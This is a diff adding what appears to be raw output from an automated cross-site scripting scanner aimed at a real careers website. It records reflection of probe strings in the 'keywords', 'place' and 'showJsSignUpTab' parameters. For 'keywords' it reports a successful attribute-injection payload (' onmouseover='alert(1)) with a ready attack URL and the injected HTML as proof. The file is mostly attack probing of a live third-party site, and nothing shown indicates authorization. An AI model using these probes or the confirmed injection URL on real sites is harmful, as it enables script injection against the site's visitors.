@@ -1,0 +1,150 @@
+https://careers.aium.org/jobseekers/
+
+GET Params:[3]
+['keywords', 'place', 'showJsSignUpTab']
+_______________________________________________________________________________________________________
+https://careers.aium.org/jobs/?keywords=(uvw"xyz'yxz</zxy&place=
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input id="bti-keywords-field"
+						class="bti-clear-box bti-search-input-text"
+						type="search"
+						name="keywords"
+						value="(uvw&quot;xyz'yxz&lt;/zxy"
+						size="35"
+						aria-label = "keywordsSearch"
+						placeholder="Keywords">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://careers.aium.org/jobs/?keywords=' onmouseover='alert(1)&place=
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input id="bti-keywords-field"
+						class="bti-clear-box bti-search-input-text"
+						type="search"
+						name="keywords"
+						value="' onmouseover='alert(1)"
+						size="35"
+						aria-label = "keywordsSearch"
+						placeholder="Keywords">
+_______________________________________________________________________________________________________
+https://careers.aium.org/jobs/?keywords=&place=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [3]
+<option value="25" selected data-url="/jobs/?place=%28uvw%22xyz%27yxz%3C%2Fzxy&keywords=&page=1">
+<option value="50"  data-url="/jobs/?place=%28uvw%22xyz%27yxz%3C%2Fzxy&keywords=&page=1">
+<option value="100"  data-url="/jobs/?place=%28uvw%22xyz%27yxz%3C%2Fzxy&keywords=&page=1">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [8]
+<a href="/jobs/?place=%28uvw%22xyz%27yxz%3C%2Fzxy&keywords=&page=1" class="bti-pagination-page-link bti-pagination-current-page">
+<a href="/jobs/?place=%28uvw%22xyz%27yxz%3C%2Fzxy&keywords=&page=2" class="bti-pagination-page-link">
+<a href="/jobs/?place=%28uvw%22xyz%27yxz%3C%2Fzxy&keywords=&page=3" class="bti-pagination-page-link">
+<a href="/jobs/?place=%28uvw%22xyz%27yxz%3C%2Fzxy&keywords=&page=4" class="bti-pagination-page-link">
+<a href="/jobs/?place=%28uvw%22xyz%27yxz%3C%2Fzxy&keywords=&page=5" class="bti-pagination-page-link">
+<a href="/jobs/?place=%28uvw%22xyz%27yxz%3C%2Fzxy&keywords=&page=18" class="bti-pagination-page-link">
+<a href="/jobs/?place=%28uvw%22xyz%27yxz%3C%2Fzxy&keywords=&page=2" class="bti-pagination-previous-link bti-pagination-prev-next">
+<link rel="next" href="https://careers.aium.org/jobs/?place=%28uvw%22xyz%27yxz%3C%2Fzxy&keywords=&page=2" />
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://careers.aium.org/login/?showJsSignUpTab=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
